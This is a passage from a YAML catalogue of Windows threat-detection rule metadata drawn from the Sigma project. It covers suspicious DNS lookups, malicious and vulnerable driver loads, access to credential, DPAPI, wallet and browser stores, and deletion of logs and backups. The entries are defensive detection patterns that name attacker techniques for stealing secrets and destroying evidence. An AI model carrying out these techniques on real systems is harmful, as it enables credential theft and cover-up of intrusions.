  - Likely with other browser software. Apply additional filters for any other browsers
    you might use.
  notes: ''
- detection_id: ec82e2a5-81ea-4211-a1f8-37a0286df2c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_susp_external_ip_lookup.yml
  name: Suspicious DNS Query for IP Lookup Service APIs
  description: Detects DNS queries for IP lookup services such as "api.ipify.org"
    originating from a non browser process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1590
  tags:
  - attack.reconnaissance
  - attack.t1590
  time_window: ''
  references:
  - https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon
  - https://twitter.com/neonprimetime/status/1436376497980428318
  - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html
  false_positives:
  - Legitimate usage of IP lookup services such as ipify API
  notes: ''
- detection_id: 778ba9a8-45e4-4b80-8e3e-34a419f0b85e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_teamviewer_domain_query_by_uncommon_app.yml
  name: TeamViewer Domain Query By Non-TeamViewer Application
  description: Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer
    client by an image that isn't named TeamViewer (sometimes used by threat actors
    for obfuscation)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.teamviewer.com/en-us/
  false_positives:
  - Unknown binary names of TeamViewer
  - Depending on the environment the rule might require some initial tuning before
    usage to avoid FP with third party applications
  notes: ''
- detection_id: b55ca2a3-7cff-4dda-8bdd-c7bfa63bf544
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_tor_onion_domain_query.yml
  name: DNS Query Tor .Onion Address - Sysmon
  description: Detects DNS queries to an ".onion" address related to Tor routing networks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1090.003
  tags:
  - attack.command-and-control
  - attack.t1090.003
  time_window: ''
  references:
  - https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/
  - https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/ASimDNS/imDNS_TorProxies.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1cbbeaaf-3c8c-4e4c-9d72-49485b6a176b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_ufile_io_query.yml
  name: DNS Query To Ufile.io
  description: Detects DNS queries to "ufile.io", which was seen abused by malware
    and threat actors as a method for data exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://thedfirreport.com/2021/12/13/diavol-ransomware/
  false_positives:
  - DNS queries for "ufile" are not malicious by nature necessarily. Investigate the
    source to determine the necessary actions to take
  notes: ''
- detection_id: b3e6418f-7c7a-4fad-993a-93b65027a9f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_vscode_tunnel_communication.yml
  name: DNS Query To Visual Studio Code Tunnels Domain
  description: 'Detects DNS query requests to Visual Studio Code tunnel domains. Attackers
    can abuse that feature to establish a reverse shell or persistence on a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  - https://cydefops.com/vscode-data-exfiltration
  false_positives:
  - Legitimate use of Visual Studio Code tunnel will also trigger this.
  notes: ''
- detection_id: 05296024-fe8a-4baf-8f3d-9a5f5624ceb2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_mal_drivers.yml
  name: Malicious Driver Load
  description: Detects loading of known malicious drivers via their hash.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1068
  time_window: ''
  references:
  - https://loldrivers.io/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39b64854-5497-4b57-a448-40977b8c9679
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_mal_drivers_names.yml
  name: Malicious Driver Load By Name
  description: Detects loading of known malicious drivers via the file name of the
    drivers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1068
  time_window: ''
  references:
  - https://loldrivers.io/
  false_positives:
  - False positives may occur if one of the vulnerable driver names mentioned above
    didn't change its name between versions. So always make sure that the driver being
    loaded is the legitimate one and the non vulnerable version.
  - If you experience a lot of FP you could comment the driver name or its exact known
    legitimate location (when possible)
  notes: ''
- detection_id: 67add051-9ee7-4ad3-93ba-42935615ae8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_pua_process_hacker.yml
  name: PUA - Process Hacker Driver Load
  description: Detects driver load of the Process Hacker tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - cve.2021-21551
  - attack.t1543
  time_window: ''
  references:
  - https://processhacker.sourceforge.io/
  false_positives:
  - Legitimate use of process hacker or system informer by developers or system administrators
  notes: ''
- detection_id: 10cb6535-b31d-4512-9962-513dcbc42cc1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_pua_system_informer.yml
  name: PUA - System Informer Driver Load
  description: Detects driver load of the System Informer tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://systeminformer.sourceforge.io/
  - https://github.com/winsiderss/systeminformer
  false_positives:
  - System Informer is regularly used legitimately by system administrators or developers.
    Apply additional filters accordingly
  notes: ''
- detection_id: 2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_susp_temp_use.yml
  name: Driver Load From A Temporary Directory
  description: Detects a driver load from a temporary directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - There is a relevant set of false positives depending on applications in the environment
  notes: ''
- detection_id: 7aaaf4b8-e47c-4295-92ee-6ed40a6f60c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_vuln_drivers.yml
  name: Vulnerable Driver Load
  description: Detects loading of known vulnerable drivers via their hash.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1068
  time_window: ''
  references:
  - https://loldrivers.io/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 72cd00d6-490c-4650-86ff-1d11f491daa1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_vuln_drivers_names.yml
  name: Vulnerable Driver Load By Name
  description: Detects the load of known vulnerable drivers via the file name of the
    drivers.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1068
  time_window: ''
  references:
  - https://loldrivers.io/
  false_positives:
  - False positives may occur if one of the vulnerable driver names mentioned above
    didn't change its name between versions. So always make sure that the driver being
    loaded is the legitimate one and the non vulnerable version.
  - If you experience a lot of FP you could comment the driver name or its exact known
    legitimate location (when possible)
  notes: ''
- detection_id: 295c9289-acee-4503-a571-8eacaef36b28
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_vuln_hevd_driver.yml
  name: Vulnerable HackSys Extreme Vulnerable Driver Load
  description: Detects the load of HackSys Extreme Vulnerable Driver which is an intentionally
    vulnerable Windows driver developed for security enthusiasts to learn and polish
    their exploitation skills at Kernel level and often abused by threat actors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1a42dfa6-6cb2-4df9-9b48-295be477e835
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_vuln_winring0_driver.yml
  name: Vulnerable WinRing0 Driver Load
  description: Detects the load of a signed WinRing0 driver often used by threat actors,
    crypto miners (XMRIG) or malware for privilege escalation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/xmrig/xmrig/tree/master/bin/WinRing0
  - https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 679085d5-f427-4484-9f58-1dc30a7c426d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/driver_load/driver_load_win_windivert.yml
  name: WinDivert Driver Load
  description: Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection
    package for Windows
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: driver_load
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1557.001
  - T1599.001
  tags:
  - attack.credential-access
  - attack.collection
  - attack.defense-evasion
  - attack.t1599.001
  - attack.t1557.001
  time_window: ''
  references:
  - https://reqrypt.org/windivert-doc.html
  - https://rastamouse.me/ntlm-relaying-via-cobalt-strike/
  false_positives:
  - Legitimate WinDivert driver usage
  notes: ''
- detection_id: 407aecb1-e762-4acf-8c7b-d087bcff3bb6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_credential_manager_access.yml
  name: Credential Manager Access By Uncommon Applications
  description: 'Detects suspicious processes based on name and location that access
    the windows credential manager and vault.

    Which can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::cred" function

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  time_window: ''
  references:
  - https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Legitimate software installed by the users for example in the "AppData" directory
    may access these files (for any reason).
  notes: ''
- detection_id: 7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_credhist.yml
  name: Access To Windows Credential History File By Uncommon Applications
  description: 'Detects file access requests to the Windows Credential History File
    by an uncommon application.

    This can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::credhist" function

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1555.004
  tags:
  - attack.credential-access
  - attack.t1555.004
  time_window: ''
  references:
  - https://tools.thehacker.recipes/mimikatz/modules/dpapi/credhist
  - https://www.passcape.com/windows_password_recovery_dpapi_credhist
  false_positives:
  - Unknown
  notes: ''
- detection_id: f41b0311-44f9-44f0-816d-dd45e39d4bc8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_crypto_currency_wallets.yml
  name: Access To Crypto Currency Wallets By Uncommon Applications
  description: 'Detects file access requests to crypto currency files by uncommon
    processes.

    Could indicate potential attempt of crypto currency wallet stealing.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Antivirus, Anti-Spyware, Anti-Malware Software
  - Backup software
  - Legitimate software installed on partitions other than "C:\"
  - Searching software such as "everything.exe"
  notes: ''
- detection_id: 46612ae6-86be-4802-bc07-39b59feb1309
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_dpapi_master_key_access.yml
  name: Access To Windows DPAPI Master Keys By Uncommon Applications
  description: 'Detects file access requests to the the Windows Data Protection API
    Master keys by an uncommon application.

    This can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::masterkey" function

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1555.004
  tags:
  - attack.credential-access
  - attack.t1555.004
  time_window: ''
  references:
  - http://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
  false_positives:
  - Unknown
  notes: ''
- detection_id: d51694fe-484a-46ac-92d6-969e76d60d10
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_gpo_files.yml
  name: Access To Potentially Sensitive Sysvol Files By Uncommon Applications
  description: Detects file access requests to potentially sensitive files hosted
    on the Windows Sysvol share.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1552.006
  tags:
  - attack.credential-access
  - attack.t1552.006
  time_window: ''
  references:
  - https://github.com/vletoux/pingcastle
  false_positives:
  - Unknown
  notes: ''
- detection_id: a1dfd976-4852-41d4-9507-dc6590a3ccd0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_susp_process_access_browser_cred_files.yml
  name: Suspicious File Access to Browser Credential Storage
  description: 'Detects file access to browser credential storage paths by non-browser
    processes, which may indicate credential access attempts.

    Adversaries may attempt to access browser credential storage to extract sensitive
    information such as usernames and passwords or cookies.

    This behavior is often commonly observed in credential stealing malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1217
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1555.003
  - attack.discovery
  - attack.t1217
  time_window: ''
  references:
  - https://github.com/splunk/security_content/blob/7283ba3723551f46b69dfeb23a63b358afb2cb0e/lookups/browser_app_list.csv?plain=1
  - https://fourcore.io/blogs/threat-hunting-browser-credential-stealing
  false_positives:
  - Antivirus, Anti-Spyware, Anti-Malware Software
  - Legitimate software accessing browser data for synchronization or backup purposes.
  - Legitimate software installed on partitions other than "C:\"
  notes: ''
- detection_id: 65744385-8541-44a6-8630-ffc824d7d4cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_access/file_access_win_teams_sensitive_files.yml
  name: Microsoft Teams Sensitive File Access By Uncommon Applications
  description: 'Detects file access attempts to sensitive Microsoft teams files (leveldb,
    cookies) by an uncommon process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_access
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/
  - https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens
  false_positives:
  - Unknown
  notes: ''
- detection_id: 558eebe5-f2ba-4104-b339-36f7902bcc1a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_change/file_change_win_2022_timestomping.yml
  name: File Creation Date Changed to Another Year
  description: 'Attackers may change the file creation time of a backdoor to make
    it look like it was installed with the operating system.

    Note that many processes legitimately change the creation time of a file; it does
    not necessarily indicate malicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_change
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.t1070.006
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html
  false_positives:
  - Changes made to or by the local NTP service
  notes: ''
- detection_id: 9f383dc0-fdeb-4d56-acbc-9f9f4f8f20f3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_change/file_change_win_unusual_modification_by_dns_exe.yml
  name: Unusual File Modification by dns.exe
  description: Detects an unexpected file being modified by dns.exe which my indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_change
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/unusual-file-modification-by-dns-exe.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 06125661-3814-4e03-bfa2-1e4411c60ac3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_backup_file.yml
  name: Backup Files Deleted
  description: Detects deletion of files with extensions often used for backup files.
    Adversaries may delete or remove built-in operating system data and turn off services
    designed to aid in the recovery of a corrupted system to prevent recovery.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-6---windows---delete-backup-files
  false_positives:
  - Legitimate usage
  notes: ''
- detection_id: 63c779ba-f638-40a0-a593-ddd45e8b1ddc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_event_log_files.yml
  name: EventLog EVTX File Deleted
  description: Detects the deletion of the event log files which may indicate an attempt
    to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: a55349d8-9588-4c5a-8e3b-1925fe2a4ffe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_exchange_powershell_logs.yml
  name: Exchange PowerShell Cmdlet History Deleted
  description: Detects the deletion of the Exchange PowerShell cmdlet History logs
    which may indicate an attempt to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://m365internals.com/2022/10/07/hunting-in-on-premises-exchange-server-logs/
  false_positives:
  - Possible FP during log rotation
  notes: ''
- detection_id: 3eb8c339-a765-48cc-a150-4364c04652bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_iis_access_logs.yml
  name: IIS WebServer Access Logs Deleted
  description: Detects the deletion of IIS WebServer access logs which may indicate
    an attempt to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/webserver-access-logs-deleted.html
  false_positives:
  - During uninstallation of the IIS service
  - During log rotation
  notes: ''
- detection_id: f01d1f70-cd41-42ec-9c0b-26dd9c22bf29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_own_image.yml
  name: Process Deletion of Its Own Executable
  description: 'Detects the deletion of a process''s executable by itself. This is
    usually not possible without workarounds and may be used by malware to hide its
    traces.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/joaoviictorti/RustRedOps/tree/ce04369a246006d399e8c61d9fe0e6b34f988a49/Self_Deletion
  false_positives:
  - Some false positives are to be expected from uninstallers.
  notes: ''
- detection_id: ff301988-c231-4bd0-834c-ac9d73b86586
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_powershell_command_history.yml
  name: PowerShell Console History Logs Deleted
  description: Detects the deletion of the PowerShell console History logs which may
    indicate an attempt to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0a1f9d29-6465-4776-b091-7f43b26e4c89
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_prefetch.yml
  name: Prefetch File Deleted
  description: Detects the deletion of a prefetch file which may indicate an attempt
    to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - Internal Research
  - https://www.group-ib.com/blog/hunting-for-ttps-with-prefetch-files/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b1decb61-ed83-4339-8e95-53ea51901720
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_teamviewer_logs.yml
  name: TeamViewer Log File Deleted
  description: Detects the deletion of the TeamViewer log files which may indicate
    an attempt to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 270185ff-5f50-4d6d-a27f-24c3b8c9fef8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_delete_tomcat_logs.yml
  name: Tomcat WebServer Logs Deleted
  description: Detects the deletion of tomcat WebServer logs which may indicate an
    attempt to destroy forensic evidence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - Internal Research
  - https://linuxhint.com/view-tomcat-logs-windows/
  false_positives:
  - During uninstallation of the tomcat server
  - During log rotation
  notes: ''
- detection_id: 6ddab845-b1b8-49c2-bbf7-1a11967f64bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_delete/file_delete_win_sysinternals_sdelete_file_deletion.yml
  name: File Deleted Via Sysinternals SDelete
  description: Detects the deletion of files by the Sysinternals SDelete utility.
    It looks for the common name pattern used to rename files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/9
